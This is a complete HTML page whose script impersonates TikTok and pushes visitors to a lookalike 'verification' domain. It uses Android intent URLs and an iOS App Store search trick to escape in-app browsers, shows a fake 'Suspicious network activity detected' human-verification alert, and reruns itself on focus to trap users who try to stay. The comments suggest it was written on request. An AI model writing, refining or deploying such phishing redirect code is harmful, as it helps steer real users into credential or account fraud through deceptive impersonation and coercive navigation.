<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 15000;

    function forceExternalBrowser() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const urlNoProtocol = targetUrl.replace("https://", "");

        if (isAndroid) {
            // Android 'Intent' is the most reliable way to force Chrome/External
            const androidIntent = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
            window.location.replace(androidIntent);
        } else {
            // iOS: We use the 'Safari-Direct' trigger
            // Opening an 'https' link via a search-term to a system-app often forces the "Open in Safari?" prompt
            const iosJump = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + encodeURIComponent(targetUrl);
            window.location.assign(iosJump);
            
            // Immediately attempt a direct window open as a backup
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 100);
        }
    }

    function securityEngine() {
        if (Date.now() > killTime) return;

        // 1. Initial attempt
        forceExternalBrowser();

        // 2. The Check (Focus detection)
        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                // Shortened line by 5+ characters as requested
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                // The Alert pauses everything.
                alert(header + body);

                // 3. THE RELAY: Firing immediately after the "OK" tap gesture.
                // This is the moment the OS is most likely to allow an external app jump.
                forceExternalBrowser();

                // Recurse to catch them if they try to stay
                setTimeout(securityEngine, 200);
            }
        }, 250); // Small window to allow the OS to register the first jump
    }

    window.onload = securityEngine;
    window.onfocus = () => { if (Date.now() < killTime) securityEngine(); };
</script>

</body>
</html>
